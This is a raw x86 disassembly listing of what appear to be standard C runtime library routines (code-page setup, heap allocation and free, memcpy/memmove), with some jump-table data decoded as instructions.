  424094:	push   eax
  424095:	push   esi
  424096:	push   DWORD PTR ds:0x45cf14
  42409c:	call   0x425bcc
  4240a1:	push   0x0
  4240a3:	push   DWORD PTR ds:0x45d024
  4240a9:	lea    eax,[ebp-0x318]
  4240af:	push   esi
  4240b0:	push   eax
  4240b1:	push   esi
  4240b2:	lea    eax,[ebp-0x118]
  4240b8:	push   eax
  4240b9:	push   0x200
  4240be:	push   DWORD PTR ds:0x45cf14
  4240c4:	call   0x425bcc
  4240c9:	add    esp,0x5c
  4240cc:	xor    eax,eax
  4240ce:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  4240d6:	test   cl,0x1
  4240d9:	je     0x4240f1
  4240db:	or     BYTE PTR [eax+0x45cf21],0x10
  4240e2:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  4240e9:	mov    BYTE PTR [eax+0x45d040],cl
  4240ef:	jmp    0x42410d
  4240f1:	test   cl,0x2
  4240f4:	je     0x424106
  4240f6:	or     BYTE PTR [eax+0x45cf21],0x20
  4240fd:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  424104:	jmp    0x4240e9
  424106:	and    BYTE PTR [eax+0x45d040],0x0
  42410d:	inc    eax
  42410e:	cmp    eax,esi
  424110:	jb     0x4240ce
  424112:	jmp    0x424158
  424114:	xor    eax,eax
  424116:	cmp    eax,0x41
  424119:	jb     0x424134
  42411b:	cmp    eax,0x5a
  42411e:	ja     0x424134
  424120:	or     BYTE PTR [eax+0x45cf21],0x10
  424127:	mov    cl,al
  424129:	add    cl,0x20
  42412c:	mov    BYTE PTR [eax+0x45d040],cl
  424132:	jmp    0x424153
  424134:	cmp    eax,0x61
  424137:	jb     0x42414c
  424139:	cmp    eax,0x7a
  42413c:	ja     0x42414c
  42413e:	or     BYTE PTR [eax+0x45cf21],0x20
  424145:	mov    cl,al
  424147:	sub    cl,0x20
  42414a:	jmp    0x42412c
  42414c:	and    BYTE PTR [eax+0x45d040],0x0
  424153:	inc    eax
  424154:	cmp    eax,esi
  424156:	jb     0x424116
  424158:	mov    ecx,DWORD PTR [ebp-0x4]
  42415b:	xor    ecx,DWORD PTR [ebp+0x4]
  42415e:	pop    esi
  42415f:	call   0x423f2c
  424164:	leave  
  424165:	ret    
  424166:	push   ebp
  424167:	mov    ebp,esp
  424169:	sub    esp,0x1c
  42416c:	mov    eax,ds:0x45c430
  424171:	xor    eax,DWORD PTR [ebp+0x4]
  424174:	push   ebx
  424175:	push   esi
  424176:	mov    esi,DWORD PTR [ebp+0x8]
  424179:	xor    ebx,ebx
  42417b:	cmp    esi,ebx
  42417d:	mov    DWORD PTR [ebp-0x4],eax
  424180:	push   edi
  424181:	je     0x4242db
  424187:	xor    edx,edx
  424189:	xor    eax,eax
  42418b:	cmp    DWORD PTR [eax+0x45c440],esi
  424191:	je     0x4241f8
  424193:	add    eax,0x30
  424196:	inc    edx
  424197:	cmp    eax,0xf0
  42419c:	jb     0x42418b
  42419e:	lea    eax,[ebp-0x1c]
  4241a1:	push   eax
  4241a2:	push   esi
  4241a3:	call   DWORD PTR ds:0x4280a0
  4241a9:	cmp    eax,0x1
  4241ac:	jne    0x4242d3
  4241b2:	push   0x40
  4241b4:	xor    eax,eax
  4241b6:	cmp    DWORD PTR [ebp-0x1c],0x1
  4241ba:	pop    ecx
  4241bb:	mov    edi,0x45cf20
  4241c0:	rep stos DWORD PTR es:[edi],eax
  4241c2:	stos   BYTE PTR es:[edi],al
  4241c3:	mov    DWORD PTR ds:0x45d024,esi
  4241c9:	mov    DWORD PTR ds:0x45cf14,ebx
  4241cf:	jbe    0x4242c1
  4241d5:	cmp    BYTE PTR [ebp-0x16],0x0
  4241d9:	je     0x424299
  4241df:	lea    ecx,[ebp-0x15]
  4241e2:	mov    dl,BYTE PTR [ecx]
  4241e4:	test   dl,dl
  4241e6:	je     0x424299
  4241ec:	movzx  eax,BYTE PTR [ecx-0x1]
  4241f0:	movzx  edx,dl
  4241f3:	jmp    0x424289
  4241f8:	push   0x40
  4241fa:	xor    eax,eax
  4241fc:	pop    ecx
  4241fd:	mov    edi,0x45cf20
  424202:	rep stos DWORD PTR es:[edi],eax
  424204:	lea    ecx,[edx+edx*2]
  424207:	shl    ecx,0x4
  42420a:	mov    DWORD PTR [ebp-0x8],ebx
  42420d:	stos   BYTE PTR es:[edi],al
  42420e:	lea    ebx,[ecx+0x45c450]
  424214:	mov    al,BYTE PTR [ebx]
  424216:	mov    esi,ebx
  424218:	jmp    0x424243
  42421a:	mov    dl,BYTE PTR [esi+0x1]
  42421d:	test   dl,dl
  42421f:	je     0x424247
  424221:	movzx  eax,al
  424224:	movzx  edi,dl
  424227:	cmp    eax,edi
  424229:	ja     0x42423f
  42422b:	mov    edx,DWORD PTR [ebp-0x8]
  42422e:	mov    dl,BYTE PTR [edx+0x45c438]
  424234:	or     BYTE PTR [eax+0x45cf21],dl
  42423a:	inc    eax
  42423b:	cmp    eax,edi
  42423d:	jbe    0x424234
  42423f:	inc    esi
  424240:	inc    esi
  424241:	mov    al,BYTE PTR [esi]
  424243:	test   al,al
  424245:	jne    0x42421a
  424247:	inc    DWORD PTR [ebp-0x8]
  42424a:	add    ebx,0x8
  42424d:	cmp    DWORD PTR [ebp-0x8],0x4
  424251:	jb     0x424214
  424253:	mov    eax,DWORD PTR [ebp+0x8]
  424256:	mov    ds:0x45d024,eax
  42425b:	mov    DWORD PTR ds:0x45cf1c,0x1
  424265:	call   0x423f7c
  42426a:	lea    ecx,[ecx+0x45c444]
  424270:	mov    esi,ecx
  424272:	mov    edi,0x45d030
  424277:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424279:	mov    ds:0x45cf14,eax
  42427e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42427f:	jmp    0x4242e0
  424281:	or     BYTE PTR [eax+0x45cf21],0x4
  424288:	inc    eax
  424289:	cmp    eax,edx
  42428b:	jbe    0x424281
  42428d:	inc    ecx
  42428e:	inc    ecx
  42428f:	cmp    BYTE PTR [ecx-0x1],0x0
  424293:	jne    0x4241e2
  424299:	xor    ecx,ecx
  42429b:	inc    ecx
  42429c:	mov    eax,ecx
  42429e:	or     BYTE PTR [eax+0x45cf21],0x8
  4242a5:	inc    eax
  4242a6:	cmp    eax,0xff
  4242ab:	jb     0x42429e
  4242ad:	mov    eax,esi
  4242af:	call   0x423f7c
  4242b4:	mov    ds:0x45cf14,eax
  4242b9:	mov    DWORD PTR ds:0x45cf1c,ecx
  4242bf:	jmp    0x4242c7
  4242c1:	mov    DWORD PTR ds:0x45cf1c,ebx
  4242c7:	xor    eax,eax
  4242c9:	mov    edi,0x45d030
  4242ce:	stos   DWORD PTR es:[edi],eax
  4242cf:	stos   DWORD PTR es:[edi],eax
  4242d0:	stos   DWORD PTR es:[edi],eax
  4242d1:	jmp    0x4242e0
  4242d3:	cmp    DWORD PTR ds:0x45cd84,ebx
  4242d9:	je     0x4242e9
  4242db:	call   0x423fab
  4242e0:	call   0x423fd4
  4242e5:	xor    eax,eax
  4242e7:	jmp    0x4242ec
  4242e9:	or     eax,0xffffffff
  4242ec:	mov    ecx,DWORD PTR [ebp-0x4]
  4242ef:	xor    ecx,DWORD PTR [ebp+0x4]
  4242f2:	pop    edi
  4242f3:	pop    esi
  4242f4:	pop    ebx
  4242f5:	call   0x423f2c
  4242fa:	leave  
  4242fb:	ret    
  4242fc:	push   0x14
  4242fe:	push   0x428550
  424303:	call   0x423858
  424308:	or     DWORD PTR [ebp-0x1c],0xffffffff
  42430c:	push   0xd
  42430e:	call   0x423a1f
  424313:	pop    ecx
  424314:	xor    edi,edi
  424316:	mov    DWORD PTR [ebp-0x4],edi
  424319:	mov    DWORD PTR ds:0x45cd84,edi
  42431f:	mov    eax,DWORD PTR [ebp+0x8]
  424322:	cmp    eax,0xfffffffe
  424325:	jne    0x424339
  424327:	mov    DWORD PTR ds:0x45cd84,0x1
  424331:	call   DWORD PTR ds:0x42809c
  424337:	jmp    0x424364
  424339:	cmp    eax,0xfffffffd
  42433c:	jne    0x424350
  42433e:	mov    DWORD PTR ds:0x45cd84,0x1
  424348:	call   DWORD PTR ds:0x428098
  42434e:	jmp    0x424364
  424350:	cmp    eax,0xfffffffc
  424353:	jne    0x424364
  424355:	mov    DWORD PTR ds:0x45cd84,0x1
  42435f:	mov    eax,ds:0x45cdb4
  424364:	mov    DWORD PTR [ebp+0x8],eax
  424367:	cmp    eax,DWORD PTR ds:0x45d024
  42436d:	je     0x42442e
  424373:	mov    esi,DWORD PTR ds:0x45cf18
  424379:	mov    DWORD PTR [ebp-0x20],esi
  42437c:	cmp    esi,edi
  42437e:	je     0x424384
  424380:	cmp    DWORD PTR [esi],edi
  424382:	je     0x424394
  424384:	push   0x220
  424389:	call   0x424582
  42438e:	pop    ecx
  42438f:	mov    esi,eax
  424391:	mov    DWORD PTR [ebp-0x20],esi
  424394:	cmp    esi,edi
  424396:	je     0x424417
  424398:	push   DWORD PTR [ebp+0x8]
  42439b:	call   0x424166
  4243a0:	pop    ecx
  4243a1:	mov    DWORD PTR [ebp-0x1c],eax
  4243a4:	cmp    eax,edi
  4243a6:	jne    0x424417
  4243a8:	mov    DWORD PTR [esi],edi
  4243aa:	mov    eax,ds:0x45d024
  4243af:	mov    DWORD PTR [esi+0x4],eax
  4243b2:	mov    eax,ds:0x45cf1c
  4243b7:	mov    DWORD PTR [esi+0x8],eax
  4243ba:	mov    eax,ds:0x45cf14
  4243bf:	mov    DWORD PTR [esi+0xc],eax
  4243c2:	xor    eax,eax
  4243c4:	mov    DWORD PTR [ebp-0x24],eax
  4243c7:	cmp    eax,0x5
  4243ca:	jge    0x4243dc
  4243cc:	mov    cx,WORD PTR [eax*2+0x45d030]
  4243d4:	mov    WORD PTR [esi+eax*2+0x10],cx
  4243d9:	inc    eax
  4243da:	jmp    0x4243c4
  4243dc:	xor    eax,eax
  4243de:	mov    DWORD PTR [ebp-0x24],eax
  4243e1:	cmp    eax,0x101
  4243e6:	jge    0x4243f5
  4243e8:	mov    cl,BYTE PTR [eax+0x45cf20]
  4243ee:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  4243f2:	inc    eax
  4243f3:	jmp    0x4243de
  4243f5:	xor    eax,eax
  4243f7:	mov    DWORD PTR [ebp-0x24],eax
  4243fa:	cmp    eax,0x100
  4243ff:	jge    0x424411
  424401:	mov    cl,BYTE PTR [eax+0x45d040]
  424407:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  42440e:	inc    eax
  42440f:	jmp    0x4243f7
  424411:	mov    DWORD PTR ds:0x45cf18,esi
  424417:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  42441b:	jne    0x424431
  42441d:	cmp    esi,DWORD PTR ds:0x45cf18
  424423:	je     0x424431
  424425:	push   esi
  424426:	call   0x42446a
  42442b:	pop    ecx
  42442c:	jmp    0x424431
  42442e:	mov    DWORD PTR [ebp-0x1c],edi
  424431:	or     DWORD PTR [ebp-0x4],0xffffffff
  424435:	call   0x424443
  42443a:	mov    eax,DWORD PTR [ebp-0x1c]
  42443d:	call   0x423893
  424442:	ret    
  424443:	push   0xd
  424445:	call   0x42398b
  42444a:	pop    ecx
  42444b:	ret    
  42444c:	cmp    DWORD PTR ds:0x45d26c,0x0
  424453:	jne    0x424467
  424455:	push   0xfffffffd
  424457:	call   0x4242fc
  42445c:	pop    ecx
  42445d:	mov    DWORD PTR ds:0x45d26c,0x1
  424467:	xor    eax,eax
  424469:	ret    
  42446a:	push   0xc
  42446c:	push   0x428560
  424471:	call   0x423858
  424476:	mov    esi,DWORD PTR [ebp+0x8]
  424479:	test   esi,esi
  42447b:	je     0x4244d5
  42447d:	cmp    DWORD PTR ds:0x45d144,0x3
  424484:	jne    0x4244c6
  424486:	push   0x4
  424488:	call   0x423a1f
  42448d:	pop    ecx
  42448e:	and    DWORD PTR [ebp-0x4],0x0
  424492:	push   esi
  424493:	call   0x424c42
  424498:	pop    ecx
  424499:	mov    DWORD PTR [ebp-0x1c],eax
  42449c:	test   eax,eax
  42449e:	je     0x4244a9
  4244a0:	push   esi
  4244a1:	push   eax
  4244a2:	call   0x424c6d
  4244a7:	pop    ecx
  4244a8:	pop    ecx
  4244a9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4244ad:	call   0x4244bd
  4244b2:	cmp    DWORD PTR [ebp-0x1c],0x0
  4244b6:	jne    0x4244d5
  4244b8:	push   DWORD PTR [ebp+0x8]
  4244bb:	jmp    0x4244c7
  4244bd:	push   0x4
  4244bf:	call   0x42398b
  4244c4:	pop    ecx
  4244c5:	ret    
  4244c6:	push   esi
  4244c7:	push   0x0
  4244c9:	push   DWORD PTR ds:0x45d140
  4244cf:	call   DWORD PTR ds:0x428088
  4244d5:	call   0x423893
  4244da:	ret    
  4244db:	push   0xc
  4244dd:	push   0x428570
  4244e2:	call   0x423858
  4244e7:	mov    esi,DWORD PTR [ebp+0x8]
  4244ea:	cmp    DWORD PTR ds:0x45d144,0x3
  4244f1:	jne    0x424521
  4244f3:	cmp    esi,DWORD PTR ds:0x45cf04
  4244f9:	ja     0x424521
  4244fb:	push   0x4
  4244fd:	call   0x423a1f
  424502:	pop    ecx
  424503:	and    DWORD PTR [ebp-0x4],0x0
  424507:	push   esi
  424508:	call   0x425421
  42450d:	pop    ecx
  42450e:	mov    DWORD PTR [ebp-0x1c],eax
  424511:	or     DWORD PTR [ebp-0x4],0xffffffff
  424515:	call   0x42454d
  42451a:	mov    eax,DWORD PTR [ebp-0x1c]
  42451d:	test   eax,eax
  42451f:	jne    0x424544
  424521:	test   esi,esi
  424523:	jne    0x424526
  424525:	inc    esi
  424526:	cmp    DWORD PTR ds:0x45d144,0x1
  42452d:	je     0x424535
  42452f:	add    esi,0xf
  424532:	and    esi,0xfffffff0
  424535:	push   esi
  424536:	push   0x0
  424538:	push   DWORD PTR ds:0x45d140
  42453e:	call   DWORD PTR ds:0x4280a4
  424544:	call   0x423893
  424549:	ret    
  42454a:	mov    esi,DWORD PTR [ebp+0x8]
  42454d:	push   0x4
  42454f:	call   0x42398b
  424554:	pop    ecx
  424555:	ret    
  424556:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  42455b:	ja     0x42457f
  42455d:	push   DWORD PTR [esp+0x4]
  424561:	call   0x4244db
  424566:	test   eax,eax
  424568:	pop    ecx
  424569:	jne    0x424581
  42456b:	cmp    DWORD PTR [esp+0x8],eax
  42456f:	je     0x424581
  424571:	push   DWORD PTR [esp+0x4]
  424575:	call   0x426142
  42457a:	test   eax,eax
  42457c:	pop    ecx
  42457d:	jne    0x42455d
  42457f:	xor    eax,eax
  424581:	ret    
  424582:	push   DWORD PTR ds:0x45cdc8
  424588:	push   DWORD PTR [esp+0x8]
  42458c:	call   0x424556
  424591:	pop    ecx
  424592:	pop    ecx
  424593:	ret    
  424594:	int3   
  424595:	int3   
  424596:	int3   
  424597:	int3   
  424598:	int3   
  424599:	int3   
  42459a:	int3   
  42459b:	int3   
  42459c:	int3   
  42459d:	int3   
  42459e:	int3   
  42459f:	int3   
  4245a0:	push   ebp
  4245a1:	mov    ebp,esp
  4245a3:	push   edi
  4245a4:	push   esi
  4245a5:	mov    esi,DWORD PTR [ebp+0xc]
  4245a8:	mov    ecx,DWORD PTR [ebp+0x10]
  4245ab:	mov    edi,DWORD PTR [ebp+0x8]
  4245ae:	mov    eax,ecx
  4245b0:	mov    edx,ecx
  4245b2:	add    eax,esi
  4245b4:	cmp    edi,esi
  4245b6:	jbe    0x4245c0
  4245b8:	cmp    edi,eax
  4245ba:	jb     0x42473c
  4245c0:	test   edi,0x3
  4245c6:	jne    0x4245dc
  4245c8:	shr    ecx,0x2
  4245cb:	and    edx,0x3
  4245ce:	cmp    ecx,0x8
  4245d1:	jb     0x4245fc
  4245d3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4245d5:	jmp    DWORD PTR [edx*4+0x4246ec]
  4245dc:	mov    eax,edi
  4245de:	mov    edx,0x3
  4245e3:	sub    ecx,0x4
  4245e6:	jb     0x4245f4
  4245e8:	and    eax,0x3
  4245eb:	add    ecx,eax
  4245ed:	jmp    DWORD PTR [eax*4+0x424600]
  4245f4:	jmp    DWORD PTR [ecx*4+0x4246fc]
  4245fb:	nop
  4245fc:	jmp    DWORD PTR [ecx*4+0x424680]
  424603:	nop
  424604:	adc    BYTE PTR [esi+0x42],al
  424607:	add    BYTE PTR [esi+eax*2],bh
  42460a:	inc    edx
  42460b:	add    BYTE PTR [eax+0x46],ah
  42460e:	inc    edx
  42460f:	add    BYTE PTR [ebx],ah
  424611:	ror    DWORD PTR [edx-0x75f877fa],1
  424617:	inc    esi
  424618:	add    DWORD PTR [eax+0x468a0147],ecx
  42461e:	add    al,cl
  424620:	jmp    0x289ce27
  424625:	add    esi,0x3
  424628:	add    edi,0x3
  42462b:	cmp    ecx,0x8
  42462e:	jb     0x4245fc
  424630:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424632:	jmp    DWORD PTR [edx*4+0x4246ec]
  424639:	lea    ecx,[ecx+0x0]
  42463c:	and    edx,ecx
  42463e:	mov    al,BYTE PTR [esi]
  424640:	mov    BYTE PTR [edi],al
  424642:	mov    al,BYTE PTR [esi+0x1]
  424645:	shr    ecx,0x2
  424648:	mov    BYTE PTR [edi+0x1],al
  42464b:	add    esi,0x2
  42464e:	add    edi,0x2
  424651:	cmp    ecx,0x8
  424654:	jb     0x4245fc
  424656:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424658:	jmp    DWORD PTR [edx*4+0x4246ec]
  42465f:	nop
  424660:	and    edx,ecx
  424662:	mov    al,BYTE PTR [esi]
  424664:	mov    BYTE PTR [edi],al
  424666:	add    esi,0x1
  424669:	shr    ecx,0x2
  42466c:	add    edi,0x1
  42466f:	cmp    ecx,0x8
  424672:	jb     0x4245fc
  424674:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424676:	jmp    DWORD PTR [edx*4+0x4246ec]
  42467d:	lea    ecx,[ecx+0x0]
  424680:	jecxz  0x4246c8
  424682:	inc    edx
  424683:	add    al,dl
  424685:	inc    esi
  424686:	inc    edx
  424687:	add    al,cl
  424689:	inc    esi
  42468a:	inc    edx
  42468b:	add    al,al
  42468d:	inc    esi
  42468e:	inc    edx
  42468f:	add    BYTE PTR [eax-0x4fffbdba],bh
  424695:	inc    esi
  424696:	inc    edx
  424697:	add    BYTE PTR [eax-0x5fffbdba],ch
  42469d:	inc    esi
  42469e:	inc    edx
  42469f:	add    BYTE PTR [ebx-0x761b71bc],cl
  4246a5:	inc    esp
  4246a6:	(bad)  
  4246a7:	in     al,0x8b
  4246a9:	inc    esp
  4246aa:	mov    gs,eax
  4246ac:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4246b0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4246b4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4246b8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4246bc:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4246c0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4246c4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4246c8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4246cc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4246d0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4246d4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4246d8:	lea    eax,[ecx*4+0x0]
  4246df:	add    esi,eax
  4246e1:	add    edi,eax
  4246e3:	jmp    DWORD PTR [edx*4+0x4246ec]
  4246ea:	mov    edi,edi
  4246ec:	cld    
  4246ed:	inc    esi
  4246ee:	inc    edx
  4246ef:	add    BYTE PTR [edi+eax*2],al
  4246f2:	inc    edx
  4246f3:	add    BYTE PTR [eax],dl
  4246f5:	inc    edi
  4246f6:	inc    edx
  4246f7:	add    BYTE PTR [edi+eax*2],ah
  4246fa:	inc    edx
  4246fb:	add    BYTE PTR [ebx+0x5f5e0845],cl
  424701:	leave  
  424702:	ret    
  424703:	nop
  424704:	mov    al,BYTE PTR [esi]
  424706:	mov    BYTE PTR [edi],al
  424708:	mov    eax,DWORD PTR [ebp+0x8]
  42470b:	pop    esi
  42470c:	pop    edi
  42470d:	leave  
  42470e:	ret    
  42470f:	nop
  424710:	mov    al,BYTE PTR [esi]
  424712:	mov    BYTE PTR [edi],al
  424714:	mov    al,BYTE PTR [esi+0x1]
  424717:	mov    BYTE PTR [edi+0x1],al
  42471a:	mov    eax,DWORD PTR [ebp+0x8]
  42471d:	pop    esi
  42471e:	pop    edi
  42471f:	leave  
  424720:	ret    
  424721:	lea    ecx,[ecx+0x0]
  424724:	mov    al,BYTE PTR [esi]
  424726:	mov    BYTE PTR [edi],al
  424728:	mov    al,BYTE PTR [esi+0x1]
  42472b:	mov    BYTE PTR [edi+0x1],al
  42472e:	mov    al,BYTE PTR [esi+0x2]
  424731:	mov    BYTE PTR [edi+0x2],al
  424734:	mov    eax,DWORD PTR [ebp+0x8]
  424737:	pop    esi
  424738:	pop    edi
  424739:	leave  
  42473a:	ret    
  42473b:	nop
  42473c:	lea    esi,[ecx+esi*1-0x4]
  424740:	lea    edi,[ecx+edi*1-0x4]
  424744:	test   edi,0x3
  42474a:	jne    0x424770
  42474c:	shr    ecx,0x2
  42474f:	and    edx,0x3
  424752:	cmp    ecx,0x8
  424755:	jb     0x424764
  424757:	std    
  424758:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42475a:	cld    
  42475b:	jmp    DWORD PTR [edx*4+0x424888]
  424762:	mov    edi,edi
  424764:	neg    ecx
  424766:	jmp    DWORD PTR [ecx*4+0x424838]
  42476d:	lea    ecx,[ecx+0x0]
  424770:	mov    eax,edi
  424772:	mov    edx,0x3
  424777:	cmp    ecx,0x4
  42477a:	jb     0x424788
  42477c:	and    eax,0x3
  42477f:	sub    ecx,eax
  424781:	jmp    DWORD PTR [eax*4+0x42478c]
  424788:	jmp    DWORD PTR [ecx*4+0x424888]
  42478f:	nop
  424790:	pushf  
  424791:	inc    edi
  424792:	inc    edx
  424793:	add    al,al
  424795:	inc    edi
  424796:	inc    edx
  424797:	add    al,ch
  424799:	inc    edi
  42479a:	inc    edx
  42479b:	add    BYTE PTR [edx-0x2edcfcba],cl
  4247a1:	mov    BYTE PTR [edi+0x3],al
  4247a4:	sub    esi,0x1
  4247a7:	shr    ecx,0x2
  4247aa:	sub    edi,0x1
  4247ad:	cmp    ecx,0x8
  4247b0:	jb     0x424764
  4247b2:	std    
  4247b3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247b5:	cld    
  4247b6:	jmp    DWORD PTR [edx*4+0x424888]
  4247bd:	lea    ecx,[ecx+0x0]
  4247c0:	mov    al,BYTE PTR [esi+0x3]
  4247c3:	and    edx,ecx
  4247c5:	mov    BYTE PTR [edi+0x3],al
  4247c8:	mov    al,BYTE PTR [esi+0x2]
  4247cb:	shr    ecx,0x2
  4247ce:	mov    BYTE PTR [edi+0x2],al
  4247d1:	sub    esi,0x2
  4247d4:	sub    edi,0x2
  4247d7:	cmp    ecx,0x8
  4247da:	jb     0x424764
  4247dc:	std    
  4247dd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247df:	cld    
  4247e0:	jmp    DWORD PTR [edx*4+0x424888]
  4247e7:	nop
  4247e8:	mov    al,BYTE PTR [esi+0x3]
  4247eb:	and    edx,ecx
  4247ed:	mov    BYTE PTR [edi+0x3],al
  4247f0:	mov    al,BYTE PTR [esi+0x2]
  4247f3:	mov    BYTE PTR [edi+0x2],al
  4247f6:	mov    al,BYTE PTR [esi+0x1]
  4247f9:	shr    ecx,0x2
  4247fc:	mov    BYTE PTR [edi+0x1],al
  4247ff:	sub    esi,0x3
  424802:	sub    edi,0x3
  424805:	cmp    ecx,0x8
  424808:	jb     0x424764
  42480e:	std    
  42480f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424811:	cld    
  424812:	jmp    DWORD PTR [edx*4+0x424888]
  424819:	lea    ecx,[ecx+0x0]
  42481c:	cmp    al,0x48
  42481e:	inc    edx
  42481f:	add    BYTE PTR [eax+ecx*2+0x42],al
  424823:	add    BYTE PTR [eax+ecx*2+0x42],cl
  424827:	add    BYTE PTR [eax+ecx*2+0x42],dl
  42482b:	add    BYTE PTR [eax+ecx*2+0x42],bl
  42482f:	add    BYTE PTR [eax+ecx*2+0x42],ah
  424833:	add    BYTE PTR [eax+ecx*2+0x42],ch
  424837:	add    BYTE PTR [edi+0x48],bh
  42483a:	inc    edx
  42483b:	add    BYTE PTR [ebx-0x76e371bc],cl
  424841:	inc    esp
  424842:	(bad)  
  424843:	sbb    al,0x8b
  424845:	inc    esp
  424846:	mov    ds,WORD PTR [eax]
  424848:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42484c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  424850:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  424854:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  424858:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42485c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  424860:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  424864:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  424868:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42486c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  424870:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  424874:	lea    eax,[ecx*4+0x0]
  42487b:	add    esi,eax
  42487d:	add    edi,eax
  42487f:	jmp    DWORD PTR [edx*4+0x424888]
  424886:	mov    edi,edi
  424888:	cwde   
  424889:	dec    eax
  42488a:	inc    edx
  42488b:	add    BYTE PTR [eax-0x4fffbdb8],ah
  424891:	dec    eax
  424892:	inc    edx
  424893:	add    ah,al
  424895:	dec    eax
  424896:	inc    edx
  424897:	add    BYTE PTR [ebx+0x5f5e0845],cl
  42489d:	leave  
  42489e:	ret    
  42489f:	nop
  4248a0:	mov    al,BYTE PTR [esi+0x3]
  4248a3:	mov    BYTE PTR [edi+0x3],al
  4248a6:	mov    eax,DWORD PTR [ebp+0x8]
  4248a9:	pop    esi
  4248aa:	pop    edi
  4248ab:	leave  
  4248ac:	ret    
  4248ad:	lea    ecx,[ecx+0x0]
  4248b0:	mov    al,BYTE PTR [esi+0x3]
  4248b3:	mov    BYTE PTR [edi+0x3],al
  4248b6:	mov    al,BYTE PTR [esi+0x2]
  4248b9:	mov    BYTE PTR [edi+0x2],al
  4248bc:	mov    eax,DWORD PTR [ebp+0x8]
  4248bf:	pop    esi
  4248c0:	pop    edi
  4248c1:	leave  
  4248c2:	ret    
  4248c3:	nop
  4248c4:	mov    al,BYTE PTR [esi+0x3]
  4248c7:	mov    BYTE PTR [edi+0x3],al
  4248ca:	mov    al,BYTE PTR [esi+0x2]
  4248cd:	mov    BYTE PTR [edi+0x2],al
  4248d0:	mov    al,BYTE PTR [esi+0x1]
  4248d3:	mov    BYTE PTR [edi+0x1],al
  4248d6:	mov    eax,DWORD PTR [ebp+0x8]
  4248d9:	pop    esi
  4248da:	pop    edi
  4248db:	leave  
  4248dc:	ret    
  4248dd:	push   DWORD PTR [esp+0x4]
  4248e1:	call   DWORD PTR ds:0x4280a8
  4248e7:	xor    eax,eax
  4248e9:	inc    eax
  4248ea:	ret    0x8
  4248ed:	push   0x10
  4248ef:	push   0x4285b8
  4248f4:	call   0x423858
  4248f9:	mov    eax,ds:0x45cd88
  4248fe:	test   eax,eax
  424900:	jne    0x424939
  424902:	cmp    DWORD PTR ds:0x45cac4,0x1
  424909:	je     0x42492f
  42490b:	push   0x4285a4
  424910:	call   DWORD PTR ds:0x428014
  424916:	test   eax,eax
  424918:	je     0x42492f
  42491a:	push   0x42857c
  42491f:	push   eax
  424920:	call   DWORD PTR ds:0x428018
  424926:	mov    ds:0x45cd88,eax
  42492b:	test   eax,eax
  42492d:	jne    0x424939
  42492f:	mov    eax,0x4248dd
  424934:	mov    ds:0x45cd88,eax
  424939:	and    DWORD PTR [ebp-0x4],0x0
  42493d:	push   DWORD PTR [ebp+0xc]
  424940:	push   DWORD PTR [ebp+0x8]
  424943:	call   eax
  424945:	mov    DWORD PTR [ebp-0x1c],eax
  424948:	jmp    0x42496e
  42494a:	mov    eax,DWORD PTR [ebp-0x14]
  42494d:	mov    eax,DWORD PTR [eax]
  42494f:	mov    eax,DWORD PTR [eax]
  424951:	mov    DWORD PTR [ebp-0x20],eax
  424954:	xor    eax,eax
  424956:	inc    eax
  424957:	ret    
  424958:	mov    esp,DWORD PTR [ebp-0x18]
  42495b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  424962:	jne    0x42496c
  424964:	push   0x8
  424966:	call   DWORD PTR ds:0x428068
  42496c:	xor    eax,eax
  42496e:	or     DWORD PTR [ebp-0x4],0xffffffff
  424972:	call   0x423893
  424977:	ret    
  424978:	push   0x10
  42497a:	push   0x4285c8
  42497f:	call   0x423858
  424984:	mov    esi,DWORD PTR [ebp+0x8]
  424987:	imul   esi,DWORD PTR [ebp+0xc]
  42498b:	mov    DWORD PTR [ebp-0x1c],esi
  42498e:	test   esi,esi
  424990:	jne    0x424993
  424992:	inc    esi
  424993:	xor    edi,edi
  424995:	mov    DWORD PTR [ebp-0x20],edi
  424998:	cmp    esi,0xffffffe0
  42499b:	ja     0x424a02
  42499d:	cmp    DWORD PTR ds:0x45d144,0x3
  4249a4:	jne    0x4249ed
  4249a6:	add    esi,0xf
  4249a9:	and    esi,0xfffffff0
